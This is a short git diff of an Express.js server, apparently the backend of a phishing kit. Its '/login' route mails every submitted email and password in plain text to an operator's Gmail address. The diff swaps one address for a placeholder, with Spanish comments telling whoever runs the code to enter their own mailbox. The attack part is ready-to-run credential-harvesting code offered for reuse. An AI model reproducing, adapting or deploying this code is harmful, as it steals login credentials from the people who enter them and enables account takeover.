@@ -34,8 +34,8 @@ app.post('/login', (req, res) => {
     const { email, password } = req.body;
 
     const mailOptions = {
-        from: 'tchiquito1999@gmail.com', // Cambia por tu correo
-        to: 'tchiquito1999@gmail.com',   // Cambia por tu correo receptor
+        from: 'correopersonal@gmail.com', // Cambia por tu correo
+        to: 'correopersonal@gmail.com',   // Cambia por tu correo receptor
         subject: 'Nuevo intento de inicio de sesión',
         text: `Se han ingresado las siguientes credenciales:\n\nCorreo: ${email}\nContraseña: ${password}`,
     };
